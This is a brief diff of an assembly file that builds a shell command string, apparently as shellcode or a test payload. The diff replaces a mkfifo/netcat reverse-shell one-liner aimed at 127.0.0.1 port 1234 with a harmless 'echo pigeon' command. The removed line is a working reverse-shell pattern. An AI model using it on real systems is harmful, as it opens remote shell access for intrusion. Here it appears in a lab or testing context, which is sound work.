@@ -10,7 +10,7 @@ shlen equ $-sh
 ; make argv on stack
 hyphenc db "-c", 0 ;3
 hyphenclen equ $-hyphenc
-cmd db "echo REVSH;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f", 0 ;
+cmd db "echo pigeon", 0 ;
 cmdlen equ $-cmd
 
 next: ; MAN
